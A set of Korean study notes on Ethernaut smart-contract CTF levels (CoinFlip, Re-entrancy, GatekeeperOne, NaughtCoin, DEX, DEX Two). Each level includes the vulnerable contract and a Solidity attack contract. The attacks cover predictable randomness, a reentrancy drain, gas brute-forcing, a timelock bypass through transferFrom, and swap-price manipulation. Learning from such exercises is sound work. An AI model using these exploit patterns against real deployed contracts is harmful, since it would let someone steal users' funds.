## Task01. Ethernaut 문제 풀이 (기초)

<details>
<summary> coin Flip </summary>

### 목표 : 동전 뒤집기 10번 성공하기

#### 문제 컨트랙트
    
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {

    uint256 public consecutiveWins; // 몇 번 맞췄는지 세주는 변수 같음
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
    consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1)); // 랜덤값 생성

    if (lastHash == blockValue) { // 이전 랜덤값이랑 위에서 만들어진 랜덤값이랑 같으면 revert
        revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false; // 앞뒷면 확인하는 부분

    if (side == _guess) {
        consecutiveWins++;
        return true;
    } else {
        consecutiveWins = 0;
        return false;
    }
    }
}
```

#### blockhash
- random number를 생성할 때 사용하는 함수
- 입력으로 block Number가 들어감  → block Number 번째의 블록의 해시값 return
→ blockNumber부터 최근 256개의 블록데이터를 이용하여 hash 결과를 만듦
- blockNumber가 최근 256개의 블록이 아니라면?
    
    → 랜덤값이 변하지 않고 고정된 값이 되어버림
    
- 같은 블록 number를 입력으로 주면 같은 값을 return
    
    → 이거 이용하면 될 것 같은데 미리 true/false 알아내서 그걸 인자로 넘겨주면 되지 않을까?


#### attack 컨트랙트
- FACTOR나 계산하는 건 그냥 CoinFlip이랑 똑같이 하고, side 값만 filp 함수 인자로 넣어서 호출하도록 만들어주면 될 것 같음
    
    ```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.0;
    
    interface CoinFlip{
    function flip(bool _guess) external returns (bool);
    }
    
    contract Attack {
        CoinFlip public coinflip;
    
        constructor() {
            coinflip = CoinFlip(0xe8A26742AdC4843f876cBD4D7af0d4DB0f49fa5B);
        }
    
        uint256 lastHash;
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        
        function getResult() public returns (bool) {
            uint256 blockValue = uint256(blockhash(block.number - 1));
            
            if (lastHash == blockValue) {
                revert();
            }
            
            lastHash = blockValue;
            uint256 coinFlip = blockValue / FACTOR;
            bool side = coinFlip == 1 ? true : false;
            
            coinflip.flip(side);
        }
    }
    ```

#### Deploy
    
![Untitled](https://file.notion.so/f/s/e27154b0-92d3-4946-9cf9-3505e00d3594/Untitled.png?id=b8d1c79c-af73-4afc-8dbb-c04c702a3d1c&table=block&spaceId=e22d3740-ccb0-45be-94fb-71b2a782635c&expirationTimestamp=1693404000000&signature=P0kpIsYSBgwaeyXGZFdSYVUSfruBif503EGWrPyUCbo&downloadName=Untitled.png)

    
#### 제대로 동작하는지 확인
    
![Untitled](https://file.notion.so/f/s/a09fc5ed-c596-4ad5-b268-5102c1d7ae2f/Untitled.png?id=d750b557-19cd-4d08-afc7-0efe50024602&table=block&spaceId=e22d3740-ccb0-45be-94fb-71b2a782635c&expirationTimestamp=1693404000000&signature=b4Zp3gJK3AUr0lyEHKHm0WcB4aI1SUfaM_ILyIBwarM&downloadName=Untitled.png)
    
- 여기 words가 consecutiveWins 값 의미하는 것 같은데 일단 여러 번 보내보겠음
    
    ![Untitled](https://file.notion.so/f/s/eadd3ec4-d22b-41a5-a120-998174a9b822/Untitled.png?id=f70f82a9-4daa-4ed0-9fb3-de9362ae0e13&table=block&spaceId=e22d3740-ccb0-45be-94fb-71b2a782635c&expirationTimestamp=1693404000000&signature=yiKQ6gpVUHeJX9BP25kxMg3_yyX9PIQLF7ywVxazr9M&downloadName=Untitled.png)
    
- 이렇게 10번 될 때까지 반복
        
    ![Untitled](https://file.notion.so/f/s/a8f7f273-3102-4347-8b15-b6d34e84507a/Untitled.png?id=dd955151-76f1-473f-b9bd-f0aedd9ef837&table=block&spaceId=e22d3740-ccb0-45be-94fb-71b2a782635c&expirationTimestamp=1693404000000&signature=pZ7zVvlAOaxic88HsoVrk8AsdVOpx_humV6jCIZytM4&downloadName=Untitled.png)
        

#### submit

![Untitled](https://file.notion.so/f/s/4cce1e65-9c8a-4014-9312-4f95e68a48b2/Untitled.png?id=c9cfb44f-b2fe-4b26-b4f1-95fda863d985&table=block&spaceId=e22d3740-ccb0-45be-94fb-71b2a782635c&expirationTimestamp=1693404000000&signature=B__k3Ale-bbZ5h6KwEHNsHjPyLqiBmU7ewpN14AMLXo&downloadName=Untitled.png)
    
</details>

<details>
<summary> Re-entrancy </summary>

### 목표 : target contract(Reentrace)로부터 모든 funds를 빼앗아오는 것


#### 문제 컨트랙트
    
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import 'openzeppelin-contracts-06/math/SafeMath.sol';

contract Reentrance {
    
    using SafeMath for uint256;
    mapping(address => uint) public balances;

    function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
    }

    function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
        (bool result,) = msg.sender.call{value:_amount}("");
        if(result) {
        _amount;
        }
        balances[msg.sender] -= _amount;
    }
    }

    receive() external payable {}
}
```
    
- donate → _to의 balance를 msg.value만큼 더해줌
- balanceOf → _who의 balance가 얼마인지 return해줌
- withdraw → msg.sender가 _amount만큼 돈 빼갈 수 있음
- receive → ETH 받아야 함


#### Re-Entrancy (재진입 공격)
- 외부 컨트랙트에서 타겟 컨트랙트의 취약한 함수를 호출하고, 트랜잭션이 끝나기 전 다시 취약한 함수를 호출하여 재진입 할 수 있게 됨
- 컨트랙트에서 컨트랙트로 이더 보낼 때
    - 이유 : 컨트랙트에서 이더 받을 때는 fallback 함수가 필요함 → receive 함수를 통한 재진입


#### Re-Entrancy를 이용한 공격 시나리오
- Attack 컨트랙트 생성
    
    → Attack contract의 receive 함수에 withdraw를 호출하는 내용 포함
    
- Attack contract에서 target contract로 1이더 보냄
- withdraw 함수 호출 
→ Attack 컨트랙트는 Bank 컨트랙트에서 1이더만큼 withdraw 가능
→ 첫 번째 if문 통과
- `msg.sender.call{value:_amount}(””);`로 msg.sender(Attack 컨트랙트)한테 _amount만큼 송금
- Attack 컨트랙트의 receive함수 실행
- 다시 withdraw 호출
- 이 때, 인출해간 값을 반영해주는 `balance[msg.sender] -= _amount;`가 아직 실행되지 않은 상태이기 때문에 첫 번째 if문을 통과할 수 있음
- 계속 반복해서 이더 빼가면 target contract의 모든 balance를 빼갈 수 있을 것!


#### Attack 컨트랙트
    
``` solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

interface Reentrance{
    function donate(address _to) payable external;
    function withdraw(uint _amount) external;
}

contract Attack{
    Reentrance public target;

    constructor() public payable{
        target = Reentrance(payable(0x180b3438a1624F77A497ee681C7e22d0Ffdc0aC2)); //인스턴스 주소
    }

    function send() public payable {
        uint256 values = address(this).balance;
        target.donate{value:values}(address(this));
        target.withdraw(values);
    }

    // function send() public payable {
    //     target.donate{value:0.001 ether}(address(this));
    //     target.withdraw(0.001 ether);
    // }
    
    receive() external payable{
        target.withdraw(0.001 ether);
    }
}
```
    
- polygonscan에 인스턴스 주소 입력해서 확인해보면 문제 컨트랙트에 0.001 MATIC이 있는 것을 확인할 수 있음
    
    ![Untitled](https://file.notion.so/f/s/48afdb75-ff73-4487-88f5-9f6e3762d0be/Untitled.png?id=dd08b639-81cd-4e7f-be04-f2919b300178&table=block&spaceId=e22d3740-ccb0-45be-94fb-71b2a782635c&expirationTimestamp=1693404000000&signature=kN7YF3-OxwaCtU3MJQW8xlneZxEPm1nUEk7TGWf6FuY&downloadName=Untitled.png)
    
- Attack 컨트랙트에 0.001 ETH 보내주고 send 함수를 호출하면 될 것 같음!
    
    ![Untitled](https://file.notion.so/f/s/ae7382bf-e118-4883-b917-a096472998d9/Untitled.png?id=a228ab0d-1e31-4369-8a04-ae13a40c9fb2&table=block&spaceId=e22d3740-ccb0-45be-94fb-71b2a782635c&expirationTimestamp=1693404000000&signature=lyNCTAWbm_Ng6iKL98MVO41IZdaM_CWFEc8u5mwQZvQ&downloadName=Untitled.png)
    
    ![Untitled](https://file.notion.so/f/s/b93e6ae6-2998-4d99-b37a-5e879e2370ee/Untitled.png?id=c016af88-881b-4414-bf55-27e38a5206b6&table=block&spaceId=e22d3740-ccb0-45be-94fb-71b2a782635c&expirationTimestamp=1693404000000&signature=FkcaouisDw1KtcAlQEx3D6p0RViEJLQ4bEp0NnfGp9w&downloadName=Untitled.png)
    
- 제대로 실행됐는지 확인하기
    
    ![Untitled](https://file.notion.so/f/s/1fd73d54-6ae0-4843-b43a-dc8c7206fd8f/Untitled.png?id=c94ba208-db72-4231-a3db-8eeb8f5b4814&table=block&spaceId=e22d3740-ccb0-45be-94fb-71b2a782635c&expirationTimestamp=1693404000000&signature=1EwuzYx7opgokFtC-m2V6_jsDsy2GfGsnHvpSF90MjA&downloadName=Untitled.png)
    
    ![Untitled](https://file.notion.so/f/s/2a36d59b-a37b-41ec-89c3-e92c6316df5f/Untitled.png?id=584b6dc3-7482-4344-b8df-e493be9cb2b6&table=block&spaceId=e22d3740-ccb0-45be-94fb-71b2a782635c&expirationTimestamp=1693404000000&signature=0NCJ-MbfwW9TJZ7ujYgiHQPUASEx31e4EBWBAhschFE&downloadName=Untitled.png)
    

#### submit
    
![Untitled](https://file.notion.so/f/s/4bc3b9d1-af46-463e-8216-14805b446225/Untitled.png?id=63e0078e-30f6-4d3b-b9d0-82a70f4238bb&table=block&spaceId=e22d3740-ccb0-45be-94fb-71b2a782635c&expirationTimestamp=1693404000000&signature=1enBTWhydrALyGJb-F6WpiBNCi9QV2R5sBAVo84mHyI&downloadName=Untitled.png)

![Untitled](https://file.notion.so/f/s/ec70c91c-1e09-4660-90c8-ba4a3162321f/Untitled.png?id=2128f440-75e5-4eaa-8240-5857f65f0ef0&table=block&spaceId=e22d3740-ccb0-45be-94fb-71b2a782635c&expirationTimestamp=1693404000000&signature=PMcXMIjHaZZ1duR3VSYXn9P9Q6SokthYCauMuucbo-M&downloadName=Untitled.png)
    
</details>

<details>
<summary> GateKeeper One </summary>

### 목표 : gatekeeper 통과해서 Level 통과하기


#### 문제 컨트랙트
    
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {

    address public entrant;

    modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
    }

    modifier gateTwo() {
    require(gasleft() % 8191 == 0);
    _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
    }
}
```
    

#### gateOne
- msg.sender가 tx.origin이면 안됨! → attack 컨트랙트 만들어서 GatekeeperOne을 호출하게끔 만들어주기


#### gateTwo
- `gasleft() returns (uint256)` : 남은 가스량
- 남은 가스량을 8191로 나눈 나머지가 0


#### gateThree
- uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)
- uint32(uint64(_gateKey)) != uint64(_gateKey)
- uint32(uint64(_gateKey)) == uint16(uint160(tx.origin))
- _gateKey 값을 뭐로 해야하는지를 찾아야 되는데 일단 이 각각의 값들이 뭘 의미하는지 알아야 될 것 같음 ...
            
    ```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.0;
    
    contract Attack{
        bytes8 gateKey;
    
        constructor(){
            gateKey = 0xabcdef1234567890;
        }
    
        function func1() public view returns (bytes8) {
            return bytes8(gateKey);
        }
        function func2() public view returns (uint32) {
            return uint32(uint64(gateKey));
        }
        function func3() public view returns (uint16) {
            return uint16(uint64(gateKey));
        }
        function func4() public view returns (uint64) {
            return uint64(gateKey);
        }
        function func5() public view returns (uint16) {
            return uint16(uint160(tx.origin));
        }
        function func6() public view returns (uint160){
            return uint160(tx.origin);
        }
    }
    ```
            
    ![Untitled](https://file.notion.so/f/s/00fe9b61-bdcd-4be5-9633-0e5771f48461/Untitled.png?id=f4353b7e-6e3a-4e34-95bb-eb5b4ce81300&table=block&spaceId=e22d3740-ccb0-45be-94fb-71b2a782635c&expirationTimestamp=1693411200000&signature=AuBaxA29gJm4l_gJS7fBdR5kZ-CU8DfYFlqqM8h-Dkk&downloadName=Untitled.png)
    
    - gateKey : 0xabcdef1234567890
    - uint32(uint64(gateKey)) : 0x34567890 → 하위 4bytes
    - uint16(uint64(gateKey)) : 0x7890 → 하위 2bytes
    - uint64(gateKey) : 0xabcdef1234567890 → gateKey
    - uint16(uint160(tx.origin)) : 0xc4c6 → 지갑 주소의 마지막 2bytes
    - uint160(tx.origin) : 0x4f26bb12173916e4459921d504a02b222eabc4c6
- 이 값들을 만족하는 gateKey 만들기
    - 마지막 2bytes는 0xc4c6이 되어야 함
    - uint32(uint64(gateKey)) == uint64(gateKey)
        
        → 0x04a02b222eabc4c6
        
    - uint32(uint64(gateKey)) ≠ uint64(gateKey)
        
        → 0x04a02b220000c4c6
                
    - 남은 가스양만 맞춰주면 되는데 call{gas:~}로 가스비 하드코딩해서 보내면 됨
        - 근데 중요한건, 이 컨트랙트를 실행시켰을 때 가스비가 얼만큼 소비되는지를 알 수가 없음 ..
        - for문으로 call{gas:~} 여기에 가스값 무차별로 대입해서 풀면?
        - 60000 + i 로 설정해놓고 i를 0~8191로 해서 for문 돌려줌


#### Attack 컨트랙트
    
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {

    address public entrant;

    modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
    }

    modifier gateTwo() {
    require(gasleft() % 8191 == 0);
    _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
    }
}

contract Attacker{
    GatekeeperOne public gatekeeperone;
    constructor() public {
        gatekeeperone = GatekeeperOne(0x89b000Ec62297c8E767F83d50523C6A48E36682D); //인스턴스 주소
    }

    function Attack() public {
        bytes8 _gateKey = 0x04a02b220000c4c6;
        for(uint256 i=0; i<300;i++){
            (bool sent, ) = address(gatekeeperone).call{gas:i+70000}(abi.encodeWithSignature("enter(bytes8)", _gateKey));
            if(sent) {
                break;
            }
        }
    }
}
```
        
- await 했는데 자꾸 값이 안나와서 at address로 직접 확인해봄
    
    ![Untitled](https://file.notion.so/f/s/04f5b924-e39c-4e93-9a88-efadd0550e7b/Untitled.png?id=7a8b0613-4f44-4ea6-a9a7-ed10fedbac18&table=block&spaceId=e22d3740-ccb0-45be-94fb-71b2a782635c&expirationTimestamp=1693411200000&signature=YFZqoy4Y3GTVxMJA7jX0SLZKAM6HlEK5JXsr3eEU0xo&downloadName=Untitled.png)
    
    → 내 지갑 주소가 잘 들어있음!!
    

#### submit

![Untitled](https://file.notion.so/f/s/23d593e5-4600-4330-a415-9a1397d7c420/Untitled.png?id=da79513b-a8fc-4634-8872-822b4bce9fb3&table=block&spaceId=e22d3740-ccb0-45be-94fb-71b2a782635c&expirationTimestamp=1693411200000&signature=bDClwREYfHPxUCBDnjGLZkK2mh5_Fubl7bdnWNO3Xbs&downloadName=Untitled.png)
        

</details>

<details> 
<summary> NaughtCoin </summary>

### 목표 : locked 되어 있는 token의 balance를 0으로 만들기


#### 문제 컨트랙트
    
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import 'openzeppelin-contracts-08/token/ERC20/ERC20.sol';

    contract NaughtCoin is ERC20 {

    // string public constant name = 'NaughtCoin';
    // string public constant symbol = '0x0';
    // uint public constant decimals = 18;
    uint public timeLock = block.timestamp + 10 * 365 days;
    uint256 public INITIAL_SUPPLY;
    address public player;

    constructor(address _player) 
    ERC20('NaughtCoin', '0x0') {
    player = _player;
    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));
    // _totalSupply = INITIAL_SUPPLY;
    // _balances[player] = INITIAL_SUPPLY;
    _mint(player, INITIAL_SUPPLY);
    emit Transfer(address(0), player, INITIAL_SUPPLY);
    }
    
    function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {
    super.transfer(_to, _value);
    }

    // Prevent the initial owner from transferring tokens until the timelock has passed
    modifier lockTokens() {
    if (msg.sender == player) {
        require(block.timestamp > timeLock);
        _;
    } else {
        _;
    }
    } 
}
```
    
- constructor
    - NaughtCoin 생성
    - 1000000 * (10**uint256(decimals()))만큼 mint
- transfer
    - to한테 value만큼 보냄
    - modifier lockTokens → block.timestamp가 timeLock보다 작거나 같으면 revert

- 이더를 0으로 만들려면 player든 누구한테든 보내야되는데 lock이 걸려 있음
- ERC20 인터페이스 정리
    - totalSupply() : 토큰의 총 발행량
    - balanceOf(address account) : account의 토큰 보유량
    - transfer(address recipient, uint amount) : recipient한테 amount만큼 토큰 전송
    - allowance(address owner, address spender) : owner가 spender한테 얼만큼 위임했는지
    - approve(address spender, uint amount) : spender한테 amount만큼 위임
    - transferFrom(address spender, address recipient, uint amount) : spender가 recipient한테 amount만큼 토큰 전송 (권한 위임 / approve 되어 있어야 됨)
- lock되어 있으면 approve해주고 transferFrom으로 보내는 건 안되나..?
    - 근데 lock은 transfer에 걸려있는거고 transferFrom은 상관 없지 않나?
    - 다른 계정한테 approve해주고 transferFrom으로 보내주면 될 것 같음!
- amount 확인하기 → 1000000000000000000000000
    
    ![Untitled](https://file.notion.so/f/s/dfd3fde3-11c3-445e-a291-49baf6d7ed50/Untitled.png?id=daac33af-c646-4d34-b332-0c4217457156&table=block&spaceId=e22d3740-ccb0-45be-94fb-71b2a782635c&expirationTimestamp=1693411200000&signature=BnBUVnY8_UWB_U72dUPzVvSRyDoAVzXkjWcynNqACC0&downloadName=Untitled.png)
    
    - mint된 돈을 전부 player가 가지고 있음


#### Attack 컨트랙트
    
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface NaughtCoin{
    function approve(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

contract Attack{
    NaughtCoin public naughtcoin;

    constructor(){
    naughtcoin = NaughtCoin(0xB1A2B791189e71c732C5C4e289e59eeBE8a1325B);
    }

    function transfer() public payable {
    address player = 0x4F26BB12173916e4459921d504a02B222eaBC4C6;
    address addr = 0x822cd1f1A9EE3128033310B81B1194B6A79aB5E3; //다른 메타마스크 계정 주소
    uint256 amount = 1000000000000000000000000;
        //uint256 amount = naughtcoin.balanceOf(player);

    naughtcoin.approve(player, amount);
    naughtcoin.transferFrom(player, addr, amount);
    }
}
```
→ 안됨 ㅜ
    

#### console에서 풀기
- 값 설정
    
    ![Untitled](https://file.notion.so/f/s/f0331ff1-7c08-46ae-ac04-b0c60c3c412b/Untitled.png?id=ef27a287-c8a7-4403-a49c-d178dd463bf3&table=block&spaceId=e22d3740-ccb0-45be-94fb-71b2a782635c&expirationTimestamp=1693411200000&signature=YdyeTOaUod4ynDesU6hJWYNE8QgF6gWbnqsqX-88XsM&downloadName=Untitled.png)
    
- approve로 player한테 amount만큼 권한 주기
    
    ![Untitled](https://file.notion.so/f/s/0ebed975-4c38-4c85-bb59-4f1449736a47/Untitled.png?id=817d335b-01e5-4697-9976-307acb2ebf94&table=block&spaceId=e22d3740-ccb0-45be-94fb-71b2a782635c&expirationTimestamp=1693411200000&signature=R9aTuJflfhGY8kCq1tuf2z7M7-fsFWFMFqGYZD3dxdE&downloadName=Untitled.png)
    
- transferFrom으로 addr로 amount 보내기
    
    ![Untitled](https://file.notion.so/f/s/9be921d4-bdee-462c-aed4-8cb75060b2e2/Untitled.png?id=4d32e0c3-8e9b-4ebf-9b94-a53e91403c05&table=block&spaceId=e22d3740-ccb0-45be-94fb-71b2a782635c&expirationTimestamp=1693411200000&signature=Pe6UEFEEiK3YLx1Nhs6UyzWi7a3UHeHgFOX2ZHjL8qs&downloadName=Untitled.png)
    
    → 실패했는데 player의 balance를 확인해보니까 0으로 바껴있음 ..
        

#### submit
    
![Untitled](https://file.notion.so/f/s/10935302-0074-4fca-b682-efc979a43285/Untitled.png?id=b49090ae-b5f3-4c62-8c5a-8b52eaff1bb8&table=block&spaceId=e22d3740-ccb0-45be-94fb-71b2a782635c&expirationTimestamp=1693411200000&signature=Dryy8WPcpFUtlJgFcga5qX4JwRPiqMLIwdZZqcZCFGw&downloadName=Untitled.png)
    
</details>

<br>


## Task02 : Ethernaut 문제 풀이 (심화)

<details>
<summary> DEX </summary>

### 목표 : DEX Contract에서 가격 조작해서 토큰 1이나 2 빼오기


#### 문제 컨트랙트
    
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
import 'openzeppelin-contracts-08/access/Ownable.sol';

contract Dex is Ownable {
    address public token1;
    address public token2;
    constructor() {}

    function setTokens(address _token1, address _token2) public onlyOwner {
    token1 = _token1;
    token2 = _token2;
    }
    
    function addLiquidity(address token_address, uint amount) public onlyOwner {
    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
    }
    
    function swap(address from, address to, uint amount) public {
    require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swapAmount = getSwapPrice(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
    }

    function getSwapPrice(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
    }

    function approve(address spender, uint amount) public {
    SwappableToken(token1).approve(msg.sender, spender, amount);
    SwappableToken(token2).approve(msg.sender, spender, amount);
    }

    function balanceOf(address token, address account) public view returns (uint){
    return IERC20(token).balanceOf(account);
    }
}

contract SwappableToken is ERC20 {
    address private _dex;
    constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply) ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
    }

    function approve(address owner, address spender, uint256 amount) public {
    require(owner != _dex, "InvalidApprover");
    super._approve(owner, spender, amount);
    }
}
```

    
#### DEX
- setTokens → token1이랑 token2 주소 설정 (owner만 할 수 있음)
- addLiquidity → 유동성 공급 → amount만큼 token_address(토큰 종류)를 dex로 보내기
- swap → 토큰 교환 → from을 to로 amount만큼 교환
- getSwapPrice → amount * 받을 토큰 총 양 / 보낼 토큰의 양
- approve → msg.sender가 spender한테 amount만큼 권한 줌
- balanceOf → acoount가 token을 얼만큼 가지고 있는지 알려줌
- SwappableToken
- approve → owner가 spender한테 amount만큼 권한 줌


- 지금 해야하는 건 토큰 1이나 토큰 2를 0으로 만드는 걸 해야 됨
- player는 토큰을 각각 10개씩 가지고 있고, dex에는 각각 100개씩 있음
- 밑에 힌트 같은 거 보면 price of the token calculated가 있는 걸로 봐서는 getSwapPrice하는 부분을 이용하면 될 것 같음
    - 생각해볼 수 있는게 소수점으로 표현 못하는 거랑 둘 중에 한 토큰의 개수를 0개로 만들어주는 방법..?
    - 근데 계속 스왑하다보면 하나 0 될 것 같긴한ㄷ ㅔ..


#### 스왑
    - swap을 6~7번정도 하면 토큰이 사라질 것 같음
    
    ![Untitled](https://file.notion.so/f/s/e584f534-02f6-4fa9-89a0-c74273f79b68/Untitled.png?id=5efc2e15-035c-4233-bbaf-a7d1a6e119dd&table=block&spaceId=e22d3740-ccb0-45be-94fb-71b2a782635c&expirationTimestamp=1693411200000&signature=gDRVris8A_X292ZGIgCFcjtpaTxSNrDugLn3hsXwIoA&downloadName=Untitled.png)


#### Attack 컨트랙트
    
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Dex{
    function token1() external view returns (address);
    function token2() external view returns (address);
    function swap(address, address, uint) external;
    function approve(address, uint) external;
}

contract Attack{
    Dex public dex;

    constructor(){
    dex = Dex(0x81a587d6444AC11fdAE2063df83015f2c5e1983F);
    }

    function swap() public {
        dex.approve(address(dex), 500);
        address token1 = dex.token1();
        address token2 = dex.token2();

        dex.swap(token1, token2, 10);
        dex.swap(token2, token1, 20);
        dex.swap(token1, token2, 24);
        dex.swap(token2, token1, 30);
        dex.swap(token1, token2, 41);
        dex.swap(token2, token1, 45);
    }
}
```
→ 이것두 안됨


#### console로 풀어보기
- 문제 컨트랙트에 권한 주기
    
    ![Untitled](https://file.notion.so/f/s/462005d6-effd-4ad1-a5e9-69039b810c36/Untitled.png?id=ac5954d4-5e95-4ca4-ad89-2b28ed4bc669&table=block&spaceId=e22d3740-ccb0-45be-94fb-71b2a782635c&expirationTimestamp=1693411200000&signature=ZfTQZulgLtTIOy0DgbJOW9WJhaRaC-zdzYWECne2p5w&downloadName=Untitled.png)
    
- token1, token2 설정해주기
    
    ![Untitled](https://file.notion.so/f/s/4c1ccf94-e498-48e9-b991-db338c3696fd/Untitled.png?id=d0b98a76-e9b1-47e5-a0ae-b25ed72ce16c&table=block&spaceId=e22d3740-ccb0-45be-94fb-71b2a782635c&expirationTimestamp=1693411200000&signature=dztUMFfE1_pUQUn0_1b_qUfNXZVs2SnnFP2zm3NJUv4&downloadName=Untitled.png)
    
- swap
    - attack 컨트랙트에 있는대로 똑같이 해줌
        
        ![Untitled](https://file.notion.so/f/s/70009c80-8c23-4310-a427-978e40e49eff/Untitled.png?id=4b1f193c-c863-404a-b47f-e264267ee028&table=block&spaceId=e22d3740-ccb0-45be-94fb-71b2a782635c&expirationTimestamp=1693411200000&signature=BSqBSOF87W6BJ3B5mKF4EtwYq7HHAzZJMVja-PvdDeg&downloadName=Untitled.png)
        
        ![Untitled](https://file.notion.so/f/s/45b66b00-4b95-4c5b-9e70-2bc781c9ce24/Untitled.png?id=cf7265c2-9eb7-45df-be0a-d961611859de&table=block&spaceId=e22d3740-ccb0-45be-94fb-71b2a782635c&expirationTimestamp=1693411200000&signature=lGN8evgi9YoDPYHsg8cyJwxep883j7ZNxMJHxitT-Zo&downloadName=Untitled.png)
        
        → 6번 스왑했을 때 t1의 토큰양이 0인 것을 확인함


#### submit
    
![Untitled](https://file.notion.so/f/s/615d39b9-976d-40c3-abca-9f6f8f45b8d5/Untitled.png?id=a9c428d7-4cf0-4678-8fb5-602c146b9068&table=block&spaceId=e22d3740-ccb0-45be-94fb-71b2a782635c&expirationTimestamp=1693411200000&signature=RL9LWLQ76VHM9IWascSKmYcFgpfmfkuMDbhIx0czlJo&downloadName=Untitled.png)
    

</details>

<details>
<summary> DEX Two </summary>

### 목표 : DEX랑 똑같은데 token을 두 개 다 모두 소진해야 함


#### 문제 컨트랙트
    
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
import 'openzeppelin-contracts-08/access/Ownable.sol';

contract DexTwo is Ownable {
    address public token1;
    address public token2;
    constructor() {}

    function setTokens(address _token1, address _token2) public onlyOwner {
    token1 = _token1;
    token2 = _token2;
    }

    function add_liquidity(address token_address, uint amount) public onlyOwner {
    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
    }
    
    function swap(address from, address to, uint amount) public {
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swapAmount = getSwapAmount(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
    } 

    function getSwapAmount(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
    }

    function approve(address spender, uint amount) public {
    SwappableTokenTwo(token1).approve(msg.sender, spender, amount);
    SwappableTokenTwo(token2).approve(msg.sender, spender, amount);
    }

    function balanceOf(address token, address account) public view returns (uint){
    return IERC20(token).balanceOf(account);
    }
}

contract SwappableTokenTwo is ERC20 {
    address private _dex;
    constructor(address dexInstance, string memory name, string memory symbol, uint initialSupply) ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
    }

    function approve(address owner, address spender, uint256 amount) public {
    require(owner != _dex, "InvalidApprover");
    super._approve(owner, spender, amount);
    }
}
```
    
- 달라진 부분
    - dex.swap에는 require문 있었는데 dex2.swap에서는 사라짐
    
    `require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");`
    
    - 나머지는 다 똑같음!
- from이랑 to가 token1, token2인지 확인을 안하는 거?
    
    → 가짜 토큰 만들어서 token1(token2)인척 하고 swap 해버리면?


#### ERC20으로 새로운 토큰 만들기
    
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol";

contract Token is ERC20 {
    constructor() ERC20("DRM", "DRM"){
    _mint(msg.sender, 400);
    }
}
```
    
